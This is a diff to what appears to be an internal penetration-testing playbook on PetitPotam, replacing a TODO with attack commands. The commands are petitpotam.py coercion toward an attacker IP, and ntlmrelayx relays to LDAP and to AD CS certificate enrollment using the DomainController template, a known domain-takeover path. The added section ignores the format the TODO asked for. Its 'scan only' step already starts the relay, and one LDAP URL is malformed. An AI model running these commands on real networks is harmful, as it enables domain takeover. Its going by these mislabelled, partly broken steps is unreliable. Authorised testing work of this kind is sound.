@@ -3,8 +3,8 @@
 # 8. PetitPotam
 
 - **Phase:** No credentials (scan); Escalation (relay, with low credentials)
-- **Risk:** The check is 🟡 Noisy *(proposed)*. **The relay is 🔴 Risky *(proposed)*: approval every time, and only if the RoE allows relaying.**
-- **Tier:** Recognize *(proposed)*
+- **Risk:** The check is 🟡 Noisy. **The relay is 🔴 Risky: approval every time, and only if the RoE allows relaying.**
+- **Tier:** Recognize
 - **Finding:** part of L03 (`smb-signing-not-required`) or L12 (`adcs-vulnerable-template`), depending on where the relay lands (`training/technique-map.md`)
 - **Runs on:** domain controllers, Server 2008 through 2022
 - **Ports:** 135, 445
@@ -19,7 +19,27 @@ It only becomes a takeover with a relay target that accepts it, which is why it 
 The 2024 Runlist lists PetitPotam twice under Escalation; this playbook covers both rows.
 
 ## Commands
-[[TODO: Copy the commands from the 2024 doc "8. Windows (AD, low creds - username and pass or hash) - DC - PetitPotam.docx", with the scan first and the relay marked as needing approval. Format per `templates/finding.md`: numbered steps, exact command in backticks, an "Expected:" line under each.]]
+
+SCAN ONLY:
+
+Terminal 1: 
+```ntlmrelayx.py -smb2support```
+
+Terminal 2:
+```python3 petitpotam.py <ATTACKER_IP> <TARGET_IP>```
+
+EXPLOITATION ONLY:
+
+```python3 petitpotam.py <ATTACKER_IP> <TARGET_IP>```
+
+Example relays:
+
+```
+ntlmrelayx.py -smb2support
+ntlmrelayx.py -t ldap://1<TARGET_IP> -smb2support
+ntlmrelayx.py -t http://<TARGET_IP>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+```
+
 
 ## Evidence to capture
 - `evidence/F-NNN-01.png`: the scan output showing the coercion request was accepted.
